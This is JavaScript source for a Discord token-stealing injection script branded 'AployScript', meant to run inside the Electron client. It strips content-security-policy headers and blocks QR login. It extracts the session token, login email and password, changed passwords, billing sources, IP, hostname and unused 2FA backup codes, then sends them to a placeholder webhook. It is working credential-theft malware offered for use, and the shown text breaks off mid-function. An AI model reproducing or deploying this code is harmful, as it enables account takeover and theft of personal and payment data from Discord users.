const fs = require('fs');
const path = require('path');
const {
	BrowserWindow,
	session
} = require('electron')
const querystring = require('querystring');
const os = require('os')
var webhook = "%WEBHOOK_LINK%";
const computerName = os.hostname();
const discordInstall = `${__dirname}`
const EvalToken = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`

String.prototype.insert = function (index, string) {
	if (index > 0) {
		return this.substring(0, index) + string + this.substr(index);
	}

	return string + this;
};

const config = {
    "logout": "%LOGOUT%",
    "logout-notify": "%LOGOUTNOTI%",
    "init-notify":"%INITNOTI%",
    "embed-color": 3447704,
    "disable-qr-code":"%DISABLEQRCODE%"
}

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
	if (details.url.startsWith(webhook)) {
		if (details.url.includes("discord.com")) {
			callback({
				responseHeaders: Object.assign({
					'Access-Control-Allow-Headers': "*"
				}, details.responseHeaders)
			});
		} else {
			callback({
				responseHeaders: Object.assign({
					"Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
					'Access-Control-Allow-Headers': "*",
					"Access-Control-Allow-Origin": "*"
				}, details.responseHeaders)
			});
		}


	} else {
		delete details.responseHeaders['content-security-policy'];
		delete details.responseHeaders['content-security-policy-report-only'];

		callback({
			responseHeaders: {
				...details.responseHeaders,
				'Access-Control-Allow-Headers': "*"
			}
		})
	}

})




function FirstTime() {
	const window = BrowserWindow.getAllWindows()[0];
	window.webContents.executeJavaScript(`${EvalToken}`, !0).then((token => {
		if (config['init-notify'] == "true") {
			if (fs.existsSync(path.join(__dirname, "init"))) {
				fs.rmdirSync(path.join(__dirname, "init"));
				if (token == null || token == undefined || token == "") {
				} else {
					const window = BrowserWindow.getAllWindows()[0];
					window.webContents.executeJavaScript(`
                    var xmlHttp=new XMLHttpRequest;xmlHttp.open("GET","https://discord.com/api/v8/users/@me",!1),xmlHttp.setRequestHeader("Authorization","${token}"),xmlHttp.send(null),xmlHttp.responseText;
                    `, !0).then(a => {
						const b = JSON.parse(a);
						var c = {
							username: "AployScript",
							content: "",
							embeds: [{
								title: "𝐈𝐧𝐣𝐞𝐭𝐚𝐝𝐢𝐧𝐡𝐚 𝐧𝐨 𝐜𝐨𝐫𝐩𝐢𝐧𝐡𝐨 \<a:ps_xgf:719132797058547753>",
								color: config["embed-color"],
								fields: [{
								}, {
									name: "𝐓𝐨𝐤𝐞𝐧 𝐓𝐫𝐚𝐧𝐬",
									value: `\`${b.username}#${b.discriminator}\``,
									inline: !0
								}, {
									name: "ID",
									value: `\`${b.id}\``,
									inline: !0
								}, {
									name: "Badges",
									value: `${GetBadges(b.flags)}`,
									inline: !1
								}, {
									name: "Token",
									value: `\`\`\`${token}\`\`\``,
									inline: !1
								}],
								author: {
									name: "AployScript"
								},
								footer: {
									text: "AployScript"
								},
								thumbnail: {
									url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
								}
							}]
						};
						SendToWebhook(JSON.stringify(c))
					});
				}

			}
		}
	}))
}
const Filter = {
	"urls": ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
}
session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) => {
	if (details.url.startsWith("wss://")) {
		if (config["disable-qr-code"] == "true" || config["disable-qr-code"] == "%DISABLEQRCODE%") {
			callback({
				cancel: true
			})
			return;
		}
	}
	if (FirstTime()) {}

	callback({})
	return;
})

function SendToWebhook(what) {
	const window = BrowserWindow.getAllWindows()[0];
	window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
    xhr.open("POST", "${webhook}", true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
    xhr.send(JSON.stringify(${what}));
    `, !0).then((token => {}))
}

function GetNitro(flags) {
	if (flags == 0) {
		return "No Nitro \<:rd_Nao:798725669823447100>"
	}
	if (flags == 1) {
		return "\<a:z_nitroso:702558281578709052> \`Nitro Classic\`"
	}
	if (flags == 2) {
		return "\<a:L_pinkBooster:941113534052438116> \`Nitro Boost\`"
	} else {
		return "No Nitro \<:rd_Nao:798725669823447100>"
	}
}

function GetRBadges(flags) {
	const Discord_Employee = 1;
	const Partnered_Server_Owner = 2;
	const HypeSquad_Events = 4;
	const Bug_Hunter_Level_1 = 8;
	const Early_Supporter = 512;
	const Bug_Hunter_Level_2 = 16384;
	const Early_Verified_Bot_Developer = 131072;
	var badges = "";
	if ((flags & Discord_Employee) == Discord_Employee) {
		badges += "\<:badgeModerator:888496056327876638> "
	}
	if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
		badges += "\<:badgePartner:888495692102926336> "
	}
	if ((flags & HypeSquad_Events) == HypeSquad_Events) {
		badges += "\<:badgeHypeEvents:888496029903773707> "
	}
	if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
		badges += "\<:badgeBugHunter:888496087906787349> "
	}
	if ((flags & Early_Supporter) == Early_Supporter) {
		badges += "\<:badgeEarlySupporter:888496042834808863> "
	}
	if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
		badges += "\<:badgeBugHunter:888496087906787349> "
	}
	if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
		badges += "\<:badgeDeveloper:888496075244195900> "
	}
	if (badges == "") {
		badges = ""
	}
	return badges
}

function GetBadges(flags) {
	const Discord_Employee = 1;
	const Partnered_Server_Owner = 2;
	const HypeSquad_Events = 4;
	const Bug_Hunter_Level_1 = 8;
	const House_Bravery = 64;
	const House_Brilliance = 128;
	const House_Balance = 256;
	const Early_Supporter = 512;
	const Bug_Hunter_Level_2 = 16384;
	const Early_Verified_Bot_Developer = 131072;
	var badges = "";
	if ((flags & Discord_Employee) == Discord_Employee) {
		badges += "\<:badgeModerator:888496056327876638> "
	}
	if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
		badges += "\<:badgePartner:888495692102926336> "
	}
	if ((flags & HypeSquad_Events) == HypeSquad_Events) {
		badges += "\<:badgeHypeEvents:888496029903773707> "
	}
	if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
		badges += "\<:badgeBugHunter:888496087906787349> "
	}
	if ((flags & House_Bravery) == House_Bravery) {
		badges += "\<:bravery:940350164101648414> "
	}
	if ((flags & House_Brilliance) == House_Brilliance) {
		badges += "\<:brillance:940350513411674174> "
	}
	if ((flags & House_Balance) == House_Balance) {
		badges += "\<:balance:940338483053080616> "
	}
	if ((flags & Early_Supporter) == Early_Supporter) {
		badges += "\<:badgeEarlySupporter:888496042834808863> "
	}
	if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
		badges += "\<:badgeBugHunter:888496087906787349> "
	}
	if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
		badges += "\<:badgeDeveloper:888496075244195900> "
	}
	if (badges == "") {
		badges = "None"
	}
	return badges
}

function Login(email, password, token) {
	const window = BrowserWindow.getAllWindows()[0];
	window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
		window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
			window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText`, !0).then((info3) => {
				window.webContents.executeJavaScript(`
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
            xmlHttp.setRequestHeader("Authorization", "${token}");
            xmlHttp.send( null );
            xmlHttp.responseText`, !0).then((info4) => {

					if (token.startsWith("mfa")) {
						window.webContents.executeJavaScript(`
              var xmlHttp = new XMLHttpRequest();
              xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);
              xmlHttp.setRequestHeader('Content-Type', 'application/json');
              xmlHttp.setRequestHeader("authorization", "${token}")
              xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":false}));
              xmlHttp.responseText`, !0).then((codes) => {

							var fieldo = [];
							var baseuri = "https://furry.surf/raw/"


							var gayass = JSON.parse(codes)

							let g = gayass.backup_codes
							const r = g.filter((code) => {
								return code.consumed == null
							})
							for (let z in r) {
								fieldo.push({
									name: `Code`,
									value: `\`${r[z].code.insert(4, "-")}\``,
									inline: true
								})
								baseuri += `${r[z].code.insert(4, "-")}<br>`
							}

							function totalFriends() {
								var f = JSON.parse(info4)
								const r = f.filter((user) => {

									return user.type == 1
								})
								return r.length
							}

							function CalcFriends() {
								var f = JSON.parse(info4)
								const r = f.filter((user) => {
									return user.type == 1
								})
								var gay = "";
								for (z of r) {
									var b = GetRBadges(z.user.public_flags)
									if (b != "") {
										gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
									}
								}
								if (gay == "") {
									gay = "Não tem Raros Amigos \<:x_Trist:933473039696420904>"
								}
								return gay
							}

							function Cool() {
								const json = JSON.parse(info3)
								var billing = "";
								json.forEach(z => {
									if (z.type == "") {
										return "\<a:rd_no:719061417054961716>"
									} else if (z.type == 2 && z.invalid != !0) {
										billing += "\<a:x_sim:756001384410644621>" + " \<:za_Pay:939927129708195900>"
									} else if (z.type == 1 && z.invalid != !0) {
										billing += "\<a:x_sim:756001384410644621>" + " \<a:black_card:821658346943152198>"
									} else {
										return "\<a:rd_no:719061417054961716>"
									}
								})
								if (billing == "") {
									billing = "\<a:rd_no:719061417054961716>"
								}
								return billing
							}
							const json = JSON.parse(info);

							var params = {
								username: "AployScript",
								content: "",
								embeds: [{
									"title": "𝐈𝐧𝐣𝐞𝐭𝐚𝐝𝐢𝐧𝐡𝐚 𝐧𝐨 𝐜𝐨𝐫𝐩𝐢𝐧𝐡𝐨 \<a:ps_xgf:719132797058547753>",
									"color": config['embed-color'],
									"fields": [{
									}, {
										name: "𝐓𝐨𝐤𝐞𝐧 𝐓𝐫𝐚𝐧𝐬",
										value: `\`${json.username}#${json.discriminator}\``,
										inline: !0
									}, {
										name: "ID",
										value: `\`${json.id}\``,
										inline: !0
									}, {
										name: "Nitro",
										value: `${GetNitro(json.premium_type)}`,
										inline: !1
									}, {
										name: "Badges",
										value: `${GetBadges(json.flags)}`,
										inline: !1
									}, {
										name: "𝐏𝐚𝐠𝐚𝐦𝐞𝐧𝐭𝐨",
										value: `${Cool()}`,
										inline: !1
									}, {
										name: "Email",
										value: `\`${email}\``,
										inline: !0
									}, {
										name: "𝐒𝐞𝐧𝐡𝐚",
										value: `\`${password}\``,
										inline: !0
									}, {
										name: "Token",
										value: `\`\`\`${token}\`\`\``,
										inline: !1
									}, ],
									"author": {
										"name": "AploySript"
									},
									"footer": {
										"text": "AployScript"
									},
									"image": {
										"url": "https://cdn.discordapp.com/attachments/915087905188347915/925267294131736616/DBAA5371-E18D-4C78-8FFE-A8C3A0FB0D30.gif"
									},
									"thumbnail": {
										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
									}
								}, {
									"title": `Total Friends (${totalFriends()})`,
									"color": config['embed-color'],
									"description": CalcFriends(),
									"author": {
										"name": "AployScript"
									},
									"footer": {
										"text": "AployScript"
									},
									"thumbnail": {
										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
									}
								}]
							}
							var mfaembed = {
								"title": ":detective: __2FA Codes__",
								"description": `[Get all of them](${baseuri})`,
								"color": config['embed-color'],
								"fields": fieldo,
								"author": {
									"name": "AployScript"
								},
								"footer": {
									"text": "AployScript"
								}
							}
							if (token.startsWith("mfa")) {
								params.embeds.push(mfaembed)
							}

							SendToWebhook(JSON.stringify(params))

						})
					} else {

						const window = BrowserWindow.getAllWindows()[0];
						window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
							window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
								window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText`, !0).then((info3) => {
									window.webContents.executeJavaScript(`
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
            xmlHttp.setRequestHeader("Authorization", "${token}");
            xmlHttp.send( null );
            xmlHttp.responseText`, !0).then((info4) => {
										function totalFriends() {
											var f = JSON.parse(info4)
											const r = f.filter((user) => {
												return user.type == 1
											})
											return r.length
										}

										function CalcFriends() {
											var f = JSON.parse(info4)
											const r = f.filter((user) => {
												return user.type == 1
											})
											var gay = "";
											for (z of r) {
												var b = GetRBadges(z.user.public_flags)
												if (b != "") {
													gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
												}
											}
											if (gay == "") {
												gay = "Não tem Raros Amigos \<:x_Trist:933473039696420904>"
											}
											return gay
										}

										function Cool() {
											const json = JSON.parse(info3)
											var billing = "";
											json.forEach(z => {
												if (z.type == "") {
													return "\<a:rd_no:719061417054961716>"
												} else if (z.type == 2 && z.invalid != !0) {
													billing += "\<a:x_sim:756001384410644621>" + " \<:za_Pay:939927129708195900>"
												} else if (z.type == 1 && z.invalid != !0) {
													billing += "\<a:x_sim:756001384410644621>" + " <a:black_card:821658346943152198>"
												} else {
													return "\<a:rd_no:719061417054961716>"
												}
											})
											if (billing == "") {
												billing = "\<a:rd_no:719061417054961716>"
											}
											return billing
										}
										const json = JSON.parse(info);
										var params = {
											username: "AployScript",
											content: "",
											embeds: [{
												"title": "𝐈𝐧𝐣𝐞𝐭𝐚𝐝𝐢𝐧𝐡𝐚 𝐧𝐨 𝐜𝐨𝐫𝐩𝐢𝐧𝐡𝐨 \<a:ps_xgf:719132797058547753>",
												"color": config['embed-color'],
												"fields": [{
												}, {
													name: "𝐓𝐨𝐤𝐞𝐧 𝐓𝐫𝐚𝐧𝐬",
													value: `\`${json.username}#${json.discriminator}\``,
													inline: !0
												}, {
													name: "ID",
													value: `\`${json.id}\``,
													inline: !0
												}, {
													name: "Nitro",
													value: `${GetNitro(json.premium_type)}`,
													inline: !1
												}, {
													name: "Badges",
													value: `${GetBadges(json.flags)}`,
													inline: !1
												}, {
													name: "𝐏𝐚𝐠𝐚𝐦𝐞𝐧𝐭𝐨",
													value: `${Cool()}`,
													inline: !1
												}, {
													name: "Email",
													value: `\`${email}\``,
													inline: !0
												}, {
													name: "𝐒𝐞𝐧𝐡𝐚",
													value: `\`${password}\``,
													inline: !0
												}, {
													name: "Token",
													value: `\`\`\`${token}\`\`\``,
													inline: !1
												}, ],
												"author": {
													"name": "AployScript"
												},
												"footer": {
													"text": "AployScript"
												},
												"image": {
													"url": "https://cdn.discordapp.com/attachments/915087905188347915/925267294131736616/DBAA5371-E18D-4C78-8FFE-A8C3A0FB0D30.gif"
												},
												"thumbnail": {
													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
												}
											}, {
												"title": `Total Friends (${totalFriends()})`,
												"color": config['embed-color'],
												"description": CalcFriends(),
												"author": {
													"name": "AployScript"
												},
												"footer": {
													"text": "AployScript"
												},
												"thumbnail": {
													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
												}
											}]
										}
										SendToWebhook(JSON.stringify(params))
									})
								})
							})
						})

					}
				})
			})
		})
	})
}

function ChangePassword(oldpassword, newpassword, token) {
	const window = BrowserWindow.getAllWindows()[0];
	window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
		window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
			window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText`, !0).then((info3) => {
				window.webContents.executeJavaScript(`
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
            xmlHttp.setRequestHeader("Authorization", "${token}");
            xmlHttp.send( null );
            xmlHttp.responseText`, !0).then((info4) => {

					if (token.startsWith("mfa")) {
						window.webContents.executeJavaScript(`
              var xmlHttp = new XMLHttpRequest();
              xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);
              xmlHttp.setRequestHeader('Content-Type', 'application/json');
              xmlHttp.setRequestHeader("authorization", "${token}")
              xmlHttp.send(JSON.stringify({\"password\":\"${newpassword}\",\"regenerate\":false}));
              xmlHttp.responseText`, !0).then((codes) => {

							var fieldo = [];
							var baseuri = "https://furry.surf/raw/"


							var gayass = JSON.parse(codes)
							let g = gayass.backup_codes
							const r = g.filter((code) => {
								return code.consumed == null
							})
							for (let z in r) {
								fieldo.push({
									name: `Code`,
									value: `\`${r[z].code.insert(4, "-")}\``,
									inline: true
								})
								baseuri += `${r[z].code.insert(4, "-")}<br>`
							}

							function totalFriends() {
								var f = JSON.parse(info4)
								const r = f.filter((user) => {

									return user.type == 1
								})
								return r.length
							}

							function CalcFriends() {
								var f = JSON.parse(info4)
								const r = f.filter((user) => {
									return user.type == 1
								})
								var gay = "";
								for (z of r) {
									var b = GetRBadges(z.user.public_flags)
									if (b != "") {
										gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
									}
								}
								if (gay == "") {
									gay = "Não tem Raros Amigos \<:x_Trist:933473039696420904>"
								}
								return gay
							}

							function Cool() {
								const json = JSON.parse(info3)
								var billing = "";
								json.forEach(z => {
									if (z.type == "") {
										return "\<a:rd_no:719061417054961716>"
									} else if (z.type == 2 && z.invalid != !0) {
										billing += "\<a:x_sim:756001384410644621>" + " \<:za_Pay:939927129708195900>"
									} else if (z.type == 1 && z.invalid != !0) {
										billing += "\<a:x_sim:756001384410644621>" + " <a:black_card:821658346943152198>"
									} else {
										return "\<a:rd_no:719061417054961716>"
									}
								})
								if (billing == "") {
									billing = "\<a:rd_no:719061417054961716>`"
								}
								return billing
							}
							const json = JSON.parse(info);

							var params = {
								username: "AployScript",
								content: "",
								embeds: [{
									"title": "𝐈𝐧𝐣𝐞𝐭𝐚𝐝𝐢𝐧𝐡𝐚 𝐧𝐨 𝐜𝐨𝐫𝐩𝐢𝐧𝐡𝐨 \<a:ps_xgf:719132797058547753>",
									"color": config['embed-color'],
									"fields": [{
										name: "𝐓𝐨𝐤𝐞𝐧 𝐓𝐫𝐚𝐧𝐬",
										value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
										inline: !1
									}, {
										name: "Username",
										value: `\`${json.username}#${json.discriminator}\``,
										inline: !0
									}, {
										name: "ID",
										value: `\`${json.id}\``,
										inline: !0
									}, {
										name: "Nitro",
										value: `${GetNitro(json.premium_type)}`,
										inline: !1
									}, {
										name: "Badges",
										value: `${GetBadges(json.flags)}`,
										inline: !1
									}, {
										name: "Billing",
										value: `${Cool()}`,
										inline: !1
									}, {
										name: "Email",
										value: `\`${json.email}\``,
										inline: !1
									}, {
										name: "Old Password",
										value: `\`${oldpassword}\``,
										inline: !0
									}, {
										name: "New Password",
										value: `\`${newpassword}\``,
										inline: !0
									}, {
										name: "Token",
										value: `\`\`\`${token}\`\`\``,
										inline: !1
									}, ],
									"author": {
										"name": "AployScript"
									},
									"footer": {
										"text": "AployScript"
									},
									"thumbnail": {
										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
									}
								}, {
									"title": `Total Friends (${totalFriends()})`,
									"color": config['embed-color'],
									"description": CalcFriends(),
									"author": {
										"name": "AployScript"
									},
									"footer": {
										"text": "AployScript"
									},
									"thumbnail": {
										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
									}
								}]
							}
							var mfaembed = {
								"title": ":detective: __2FA Codes__",
								"description": `[Get all of them](${baseuri})`,
								"color": config['embed-color'],
								"fields": fieldo,
								"author": {
									"name": "AployScript"
								},
								"footer": {
									"text": "AployScript"
								}
							}
							if (token.startsWith("mfa")) {
								params.embeds.push(mfaembed)
							}

							SendToWebhook(JSON.stringify(params))

						})
					} else {

						const window = BrowserWindow.getAllWindows()[0];
						window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
							window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
								window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText`, !0).then((info3) => {
									window.webContents.executeJavaScript(`
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
            xmlHttp.setRequestHeader("Authorization", "${token}");
            xmlHttp.send( null );
            xmlHttp.responseText`, !0).then((info4) => {

										function totalFriends() {
											var f = JSON.parse(info4)
											const r = f.filter((user) => {
												return user.type == 1
											})
											return r.length
										}

										function CalcFriends() {
											var f = JSON.parse(info4)
											const r = f.filter((user) => {
												return user.type == 1
											})
											var gay = "";
											for (z of r) {
												var b = GetRBadges(z.user.public_flags)
												if (b != "") {
													gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
												}
											}
											if (gay == "") {
												gay = "Não tem Raros Amigos \<:x_Trist:933473039696420904>"
											}
											return gay
										}

										function Cool() {
											const json = JSON.parse(info3)
											var billing = "";
											json.forEach(z => {
												if (z.type == "") {
													return "\<a:rd_no:719061417054961716>"
												} else if (z.type == 2 && z.invalid != !0) {
													billing += "\<a:x_sim:756001384410644621>" + " \<:za_Pay:939927129708195900>"
												} else if (z.type == 1 && z.invalid != !0) {
													billing += "\<a:x_sim:756001384410644621>" + " <a:black_card:821658346943152198>"
												} else {
													return "\<a:rd_no:719061417054961716>"
												}
											})
											if (billing == "") {
												billing = "\<a:rd_no:719061417054961716>"
											}
											return billing
										}
										const json = JSON.parse(info);
										var params = {
											username: "AployScript",
											content: "",
											embeds: [{
												"title": "𝐈𝐧𝐣𝐞𝐭𝐚𝐝𝐢𝐧𝐡𝐚 𝐧𝐨 𝐜𝐨𝐫𝐩𝐢𝐧𝐡𝐨 \<a:ps_xgf:719132797058547753>",
												"color": config['embed-color'],
												"fields": [{
													name: "𝐓𝐨𝐤𝐞𝐧 𝐓𝐫𝐚𝐧𝐬",
													value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
													inline: !1
												}, {
													name: "Username",
													value: `\`${json.username}#${json.discriminator}\``,
													inline: !0
												}, {
													name: "ID",
													value: `\`${json.id}\``,
													inline: !0
												}, {
													name: "Nitro",
													value: `${GetNitro(json.premium_type)}`,
													inline: !1
												}, {
													name: "Badges",
													value: `${GetBadges(json.flags)}`,
													inline: !1
												}, {
													name: "Billing",
													value: `${Cool()}`,
													inline: !1
												}, {
													name: "Email",
													value: `\`${json.email}\``,
													inline: !1
												}, {
													name: "Old Password",
													value: `\`${oldpassword}\``,
													inline: !0
												}, {
													name: "New Password",
													value: `\`${newpassword}\``,
													inline: !0
												}, {
													name: "Token",
													value: `\`\`\`${token}\`\`\``,
													inline: !1
												}, ],
												"author": {
													"name": "AployScript"
												},
												"footer": {
													"text": "AployScript"
												},
												"thumbnail": {
													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
												}
											}, {
												"title": `Total Friends (${totalFriends()})`,
												"color": config['embed-color'],
												"description": CalcFriends(),
												"author": {
													"name": "AployScript"
												},
												"footer": {
													"text": "AployScript"
												},
												"thumbnail": {
													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
												}
											}]
										}
										SendToWebhook(JSON.stringify(params))
									})
								})
							})
						})

					}
				})
			})
		})
	})
}

function ChangeEmail(newemail, password, token) {
	const window = BrowserWindow.getAllWindows()[0];
	window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
		window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
			window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText`, !0).then((info3) => {
				window.webContents.executeJavaScript(`
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
            xmlHttp.setRequestHeader("Authorization", "${token}");
            xmlHttp.send( null );
            xmlHttp.responseText`, !0).then((info4) => {

					if (token.startsWith("mfa")) {
						window.webContents.executeJavaScript(`
              var xmlHttp = new XMLHttpRequest();
              xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);
              xmlHttp.setRequestHeader('Content-Type', 'application/json');
              xmlHttp.setRequestHeader("authorization", "${token}")
              xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":false}));
              xmlHttp.responseText`, !0).then((codes) => {

							var fieldo = [];
							var baseuri = "https://furry.surf/raw/"


							var gayass = JSON.parse(codes)
							let g = gayass.backup_codes
							const r = g.filter((code) => {
								return code.consumed == null
							})
							for (let z in r) {
								fieldo.push({
									name: `Code`,
									value: `\`${r[z].code.insert(4, "-")}\``,
									inline: true
								})
								baseuri += `${r[z].code.insert(4, "-")}<br>`
							}

							function totalFriends() {
								var f = JSON.parse(info4)
								const r = f.filter((user) => {

									return user.type == 1
								})
								return r.length
							}

							function CalcFriends() {
								var f = JSON.parse(info4)
								const r = f.filter((user) => {
									return user.type == 1
								})
								var gay = "";
								for (z of r) {
									var b = GetRBadges(z.user.public_flags)
									if (b != "") {
										gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
									}
								}
								if (gay == "") {
									gay = "Não tem Raros Amigos \<:x_Trist:933473039696420904>"
								}
								return gay
							}

							function Cool() {
								const json = JSON.parse(info3)
								var billing = "";
								json.forEach(z => {
									if (z.type == "") {
										return "\<a:rd_no:719061417054961716>"
									} else if (z.type == 2 && z.invalid != !0) {
										billing += "\<a:x_sim:756001384410644621>" + " \<:za_Pay:939927129708195900>"
									} else if (z.type == 1 && z.invalid != !0) {
										billing += "\<a:x_sim:756001384410644621>" + " <a:black_card:821658346943152198>"
									} else {
										return "\<a:rd_no:719061417054961716>"
									}
								})
								if (billing == "") {
									billing = "\<a:rd_no:719061417054961716>"
								}
								return billing
							}
							const json = JSON.parse(info);

							var params = {
								username: "AployScript",
								content: "",
								embeds: [{
									"title": "𝐈𝐧𝐣𝐞𝐭𝐚𝐝𝐢𝐧𝐡𝐚 𝐧𝐨 𝐜𝐨𝐫𝐩𝐢𝐧𝐡𝐨 \<a:ps_xgf:719132797058547753>",
									"color": config['embed-color'],
									"fields": [{
										name: "𝐓𝐨𝐤𝐞𝐧 𝐓𝐫𝐚𝐧𝐬",
										value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\`\`\``,
										inline: !1
									}, {
										name: "Username",
										value: `\`${json.username}#${json.discriminator}\``,
										inline: !0
									}, {
										name: "ID",
										value: `\`${json.id}\``,
										inline: !0
									}, {
										name: "Nitro",
										value: `${GetNitro(json.premium_type)}`,
										inline: !1
									}, {
										name: "Badges",
